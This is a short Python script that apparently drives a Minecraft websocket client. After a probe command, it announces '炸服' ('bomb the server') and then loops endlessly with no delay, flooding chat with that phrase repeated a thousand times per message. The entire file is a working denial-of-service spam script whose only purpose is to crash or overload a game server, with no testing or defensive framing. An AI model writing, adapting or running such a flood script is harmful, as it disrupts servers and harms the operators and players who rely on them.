import asyncio
from send_message import *

def main(client,wait_sympol):
	asyncio.create_task(_main(client,wait_sympol))

async def _main(client,wait_sympol):
	await asyncio.sleep(1)
	wait_sympol[0] = True
	await asyncio.sleep(1)
	await client.send(command("testfor @s"))
	await asyncio.sleep(1)
	await client.send(command("say 炸服"))
	while True:
		# 		re = (await client.recv()).replace("{","").replace("}","").replace("[","").replace("]","").replace(",","").replace("\"","")
		re = "炸服"*1000
		await client.send(command(say(re)))
		await asyncio.sleep(0)
